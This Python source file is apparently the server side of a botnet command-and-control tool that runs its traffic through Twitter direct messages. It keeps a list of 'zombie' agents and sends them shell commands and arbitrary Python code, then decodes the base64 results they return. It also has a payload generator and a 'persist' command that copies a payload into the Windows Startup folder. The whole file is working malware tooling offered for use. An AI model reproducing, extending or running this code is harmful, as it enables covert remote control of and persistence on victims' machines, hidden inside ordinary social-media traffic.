import tweepy
import json
import base64
import _thread
import time
import subprocess
import os

from tweepy import OAuthHandler
from tc2lib import *
from subprocess import Popen as popen
from subprocess import PIPE as pipe

global username, posts, pause, agent_user

path = os.path.dirname(os.path.abspath(__file__))
pcos = input("Enter your operating system [win/lin]: ").lower()
while not (pcos == "win" or pcos == "lin"):
        input("Enter your operating system [win/lin]: ").lower()

if pcos == "win":
        ignoretxt = path+"\\ignore.txt"
elif pcos == "lin":
        ignoretxt = path+"/ignore.txt"
else: print("Something has gone horribly wrong...")

consumer_key, consumer_secret, access_token, access_secret, username, agent_user = get_keys()

auth = OAuthHandler(consumer_key, consumer_secret)
auth.set_access_token(access_token, access_secret)

api = tweepy.API(auth,wait_on_rate_limit=True)
pause = 2

queue = [] # ids of posts to handle
agents = []

def ignore():
        try:
                with open(ignoretxt,"r") as idfile:
                        ids = idfile.read().split("\n")
                        idlist = []
                        for ID in ids:
                                if not ID == '':
                                        idlist.append(int(ID))
                        return idlist
        except:
                with open(ignoretxt,"w") as idfile: return []
def add_ignore(ID):
        if not ID in ignore():
                with open(ignoretxt,"a") as idfile:
                        idfile.write(str(ID)+"\n")

def run_cmd(cmd):
        if ' ' in cmd:
                if cmd.split(" ")[0].lower() == "cd":
                        newdir = cmd.split(" ")[1]
                        try:
                                os.chdir(newdir)
                                return newdir
                        except FileNotFoundError:
                                return "[Error]: FileNotFoundError"
        result = (popen(cmd,stdout=pipe,shell=True).communicate())[0].decode()
        if result == '':
                return "[blank/error]"
        else:
                return result

def check_dms():
        dms = []
        while True:
                newdms = []
                for dm in api.direct_messages(tweet_mode='extended'):
                        if dm.sender_screen_name == agent_user:
                                ID = dm.id
                                if not ID in ignore():
                                        if not ID in queue:
                                                queue.append(ID)
                time.sleep(pause)

def sort_queue():
        for ID in queue:
                message = api.get_direct_message(ID, tweet_mode='extended', full_text=True)
                handle_message(message)
                queue.remove(ID)
                add_ignore(ID)

def handle_message(message):
        text = message.text
        if '$' in list(text):
                encoded = text.split('$c2$')[1]
                data = unformat_msg(encoded)
                if (not data["from"] == "server") and (data["to"] == "server"):
                        if not data["from"] in agents:
                                agents.append(data["from"])
                                print("[+] New agent [%s]" % (data["from"]))
                        else:
                                if data["refresh"]:
                                        print("[+] Agent [%s] is alive" % (data["from"]))
                                elif data["result"]:
                                        result = base64.b64decode((data["result"]).encode()).decode()
                                        print("[+] Got result from [%s]:\n%s" % (data["from"], result))


def start_polling():
        _thread.start_new_thread(check_dms, ())
        while True:
                sort_queue()
                time.sleep(pause)





def user_menu():
        global pause, zombie
        print(mainmenu)
        zombie = ''
        cmdmsg = 'menu'
        while True:
                cmd = input("[%s]: " % cmdmsg)
                if cmd == "exit":
                        print("Pausing for [%s] to wait for data..." % str(pause))
                        time.sleep(pause)
                        exit(0)
                elif cmd == "help":
                        print(mainmenu)
                elif cmd == "clear":
                        print("\n"*50)
                elif cmd == "list":
                        for bot in agents:
                                print(bot)
                elif cmd == "refresh":
                        message = format_msg("server","all",False,False,True)
                        dm = api.send_direct_message(agent_user,text=message)
                        add_ignore(dm.id)
                        print("[+] Sent refresh command")
                elif cmd == "ping":
                        if not zombie == '':
                                message = format_msg("server",zombie,False,False,True)
                                dm = api.send_direct_message(agent_user,text=message)
                                add_ignore(dm.id)
                                print("[+] Sent ping to [%s]" % zombie)
                        else:
                                print(error_noZombie)
                elif cmd == "shell":
                        if not (zombie == '' or zombie == 'all'):
                                running = True
                                while running:
                                        command = {"type":"shell","get_result":True,"background":False}
                                        shellcmd = input(zombie+"# ")
                                        if not shellcmd == '':
                                                if shellcmd == "exit":
                                                        running = False
                                                        break
                                                command["cmd"] = shellcmd
                                                msg = format_msg("server",zombie,command,False,False)
                                                dm = api.send_direct_message(agent_user,text=msg)
                                                add_ignore(dm.id)
                                                print("[+] Sent command, response should arrive soon")
                                        else:
                                                print()
                        else:
                                print("[!] Please select zombie / zombie cannot be 'all'")
                elif cmd == "lshell":
                        running = True
                        tmpuser = run_cmd("whoami")
                        l_user = ''
                        for char in list(tmpuser):
                                if not len(l_user) == 4:
                                        l_user += char
                        while running:
                                cmd = input(l_user+"# ")
                                if not cmd == "exit":
                                        try:
                                                print(run_cmd(cmd))
                                        except Exception as e: print("[Error]: "+str(e))
                                else:
                                        running = False
                elif cmd == "genPayload":
                        gen_payload()
                elif cmd == "persist":
                        if not zombie == "":
                                payloadname = input("Enter payload file name (eg. payload.exe): ")
                                cmd = "copy %s %s" % (payloadname,'C:\ProgramData\Microsoft\Windows\"Start Menu"\Programs\Startup')
                                command = {"type":"shell","cmd":cmd,"get_result":True,"background":False}
                                msg = format_msg("server",zombie,command,False,False)
                                add_ignore(api.send_direct_message(agent_user,text=msg).id)
                                print("Sent persist command to [%s]" % zombie)
                        else: print("[!] Please select zombie first")
                elif ' ' in list(cmd):
                        parts = cmd.split(" ")
                        com = parts[0]
                        if com == "polling":
                                try:
                                        pause = int(parts[1])
                                except Exception as e:
                                        print("[Error]: Argument must be a valid integer")
                        elif com == "use":
                                try:
                                        usebot = parts[1]
                                        if usebot in agents:
                                                zombie = usebot
                                        elif usebot == "all":
                                                zombie = usebot
                                        else: print("[!] Zombie name is not in list of agents")
                                except: print(error_noArgs)
                        elif com == "zombiePolling":
                                try:
                                        newtime = int(parts[1])
                                        if not zombie == '':
                                                command = {"type":"python","cmd":("pause = "+str(newtime)),"get_result":False,"background":False}
                                                msg = format_msg("server",zombie,command,False,False)
                                                dm = api.send_direct_message(agent_user,text=msg)
                                                add_ignore(dm.id)
                                                print("[*] Changed [%s] polling time to [%s]" % (zombie,str(newtime)))
                                        else: print("[!] Please select zombie first")
                                except Exception as e: print("[Error]: "+str(e))
                        elif com == "cmd":
                                if not zombie == "":
                                        cmdstring = ''
                                        for word in parts:
                                                if not word == "cmd":
                                                        if len(cmdstring) == 0:
                                                                cmdstring += word
                                                        else:
                                                                cmdstring += " "+word
                                        command = {"type":"shell","cmd":cmdstring,"get_result":True,"background":False}
                                        msg = format_msg("server",zombie,command,False,False)
                                        dm = api.send_direct_message(agent_user,text=msg)
                                        add_ignore(dm.id)
                                        print("[+] Sent command to [%s]" % zombie)
                                else:
                                        print("[!] Please select zombie first")
                        elif com == "py":
                                if not zombie == "":
                                        pycmd = ''
                                        for part in parts:
                                                if not part == "py":
                                                        if len(pycmd) == 0:
                                                                pycmd += part
                                                        else:
                                                                pycmd += " "+part
                                        command = {"type":"python","cmd":pycmd,"get_result":False,"background":False}
                                        msg = format_msg("server",zombie,command,False,False)
                                        dm = api.send_direct_message(agent_user,text=msg)
                                        add_ignore(dm.id)
                                        print("Send python code to [%s]" % zombie)
                                else: print("[!] Please select zombie first")
                        else: print(error_noCmd)
                else: print(error_noCmd)




_thread.start_new_thread(start_polling, ( ))
user_menu()
